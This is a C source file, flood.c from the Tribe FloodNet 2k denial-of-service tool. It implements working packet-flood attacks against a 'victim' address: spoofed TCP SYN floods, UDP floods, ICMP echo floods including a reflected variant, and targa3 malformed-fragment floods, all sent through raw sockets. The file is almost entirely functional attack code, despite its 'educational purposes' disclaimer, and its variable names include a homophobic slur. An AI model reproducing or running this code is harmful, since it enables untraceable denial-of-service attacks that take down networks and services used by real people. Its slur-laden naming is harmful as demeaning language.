/*
 * Tribe FloodNet - 2k edition
 * by Mixter <mixter@newyorkoffice.com>
 *
 * flood.c - packet flood implementations
 *
 * This program is distributed for educational purposes and without any
 * explicit or implicit warranty; in no event shall the author or
 * contributors be liable for any direct, indirect or incidental damages
 * arising in any way out of the use of this software.
 *
 */

#include "tribe.h"

extern int rcounter;
extern char rseed[];

int rawsock = 0, fw00ding = 0, nospoof = 0, port4syn = 0, psize = 0;
static char synb[8192];
static int fbi = 1, cia = 65535;

void
syn (unsigned long victim, unsigned short port)
{
  struct sa sin;
  struct ip *ih = (struct ip *) synb;
  struct tcp *th = (struct tcp *) (synb + sizeof (struct ip));
  ih->ver = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tl = sizeof (ih) + sizeof (th);
  ih->id = htons (getrandom (1024, 65535));
  ih->off = 0;
  ih->ttl = getrandom (200, 255);
  ih->pro = TCP;
  ih->sum = 0;
  ih->src = k00lip ();
  ih->dst = victim;
  th->src = htons (getrandom (0, 65535));
  if (port > 0)
    th->dst = htons (port);
  else
    th->dst = htons (getrandom (0, 65535));
  th->seq = htonl (getrandom (0, 65535) + (getrandom (0, 65535) << 8));
  th->ack = htons (getrandom (0, 65535));
  th->flg = SYN | URG;
  th->win = htons (getrandom (0, 65535));
  th->sum = 0;
  th->urp = htons (getrandom (0, 65535));
  th->sum = ip_sum ((u16 *) synb, (sizeof (struct ip) + sizeof (struct tcp) + 1) & ~1);
  ih->sum = ip_sum ((u16 *) synb, (4 * ih->ihl + sizeof (struct tcp) + 1) & ~1);
  sin.fam = AF_INET;
  sin.dp = th->dst;
  sin.add = ih->dst;
  sendto (rawsock, synb, 4 * ih->ihl + sizeof (struct tcp), 0, (struct sockaddr *) &sin, sizeof (sin));
}

void
udp (unsigned long lamer)
{
  int tot_len = sizeof (struct ip) + sizeof (struct udp) + 1 + psize;
  struct sa llama;
  struct
    {
      struct ip iph;
      struct udp udph;
      unsigned char evil[65535];
    }
  faggot;

  faggot.evil[psize] = '\0';

  if (fbi++ > 65535)
    fbi = 1;
  if (cia-- < 1)
    cia = 65535;

  faggot.iph.ihl = 5;
  faggot.iph.ver = 4;
  faggot.iph.tos = 0x00;
  faggot.iph.tl = htons (tot_len);
  faggot.iph.id = htons (getrandom (0, 65535));
  faggot.iph.off = 0;
  faggot.iph.ttl = getrandom (200, 255);
  faggot.iph.pro = UDP;
  faggot.iph.src = k00lip ();
  faggot.iph.dst = lamer;
  faggot.iph.sum = ip_sum ((u16 *) & faggot.iph, sizeof (faggot.iph));

  faggot.udph.src = htons (cia);
  faggot.udph.dst = htons (fbi);
  faggot.udph.len = htons (sizeof (faggot.udph) + 1 + psize);
  faggot.udph.sum = 0;
  faggot.udph.sum = cksum ((u16 *) & faggot.udph, tot_len >> 1);

  llama.fam = AF_INET;
  llama.dp = faggot.udph.dst;
  llama.add = lamer;

  sendto (rawsock, &faggot, tot_len, 0, (struct sockaddr *) &llama, sizeof (llama));
}

void
icmp (unsigned long lamer, unsigned long src)
{
  struct sa pothead;
  struct ip *iph;
  struct icmp *icmph;
  char *packet;
  int pktsize = sizeof (struct ip) + sizeof (struct icmp) + 64;

  if (psize)
    pktsize += psize;

  packet = malloc (pktsize);
  iph = (struct ip *) packet;
  icmph = (struct icmp *) (packet + sizeof (struct ip));
  memset (packet, 0, pktsize);
  iph->ver = 4;
  iph->ihl = 5;
  iph->tos = 0;
  iph->tl = htons (pktsize);
  iph->id = htons (getpid ());
  iph->off = 0;
  iph->ttl = 0x0;
  iph->pro = ICMP;
  iph->sum = 0;
  if (src == 0)
    {
      iph->src = k00lip ();
      iph->dst = lamer;
    }
  else
    {
      iph->src = lamer;
      iph->dst = src;
    }
  icmph->type = ICMP_ECHO;
  icmph->code = 0;
  icmph->sum = htons (~(ICMP_ECHO << 8));

  pothead.fam = AF_INET;
  pothead.dp = htons (0);
  pothead.add = iph->dst;

  sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &pothead, sizeof (struct sockaddr));
  free (packet);
}

void
targa3 (unsigned long victim)
{
  int mysize = sizeof (struct ip) + getrandom (128, 512) + psize, i;
  char *packet = calloc (1, mysize);
  struct ip *iph = (struct ip *) packet;
  struct udp *udh = (struct udp *) (packet + sizeof (struct ip));
  struct tcp *tch = (struct tcp *) (packet + sizeof (struct ip));
  struct icmp *ich = (struct icmp *) (packet + sizeof (struct ip));
  struct sa sin;

  int proto[14] =
  {				/* known internet protcols */
    0, 1, 2, 4, 6, 8, 12, 17, 22, 41, 58, 255, 0,
  };
  int frags[10] =
  {				/* (un)common fragment values */
    0, 0, 0, 8192, 0x4, 0x6, 16383, 1, 0,
  };
  int flags[7] =
  {				/* (un)common message flags */
    0, 0, 0, 0x4, 0, 0x1,
  };

  for (i = 0; i < mysize; i++)
    {
      if (rcounter-- < 1)
	random_init ();
      packet[i] = rseed[rcounter];
    }
  proto[13] = getrandom (0, 255);
  frags[9] = getrandom (0, 8100);
  flags[6] = getrandom (0, 0xf);
  iph->ver = 4;
  iph->ihl = 5;
  iph->tos = 0;
  iph->tl = htons (mysize);
  iph->id = htons (getrandom (0, 65535) + (getrandom (0, 65535) << 8));
  iph->ttl = 0x00;
  iph->pro = proto[(int) getrandom (0, 13)];
  switch (iph->pro)
    {
    case TCP:
      tch->sum = 0;
      tch->sum = cksum ((u16 *) packet, mysize >> 1);
      break;
    case ICMP:
      ich->sum = 0;
      ich->sum = cksum ((u16 *) packet, mysize >> 1);
      break;
    case UDP:
      udh->sum = 0;
      udh->sum = cksum ((u16 *) packet, mysize >> 1);
      break;
    }
  iph->off = htons (frags[(int) getrandom (0, 9)]);
  iph->sum = 0;
  iph->src = getrandom (0, 65535) + (getrandom (0, 65535) << 8);
  iph->dst = victim;

  sin.fam = AF_INET;
  sin.dp = htons (0);
  sin.add = victim;

  sendto (rawsock,
	  packet,
	  mysize,
	  flags[(int) getrandom (0, 6)],
	  (struct sockaddr *) &sin,
	  sizeof (sin));
  free (packet);		/* free willy */
}
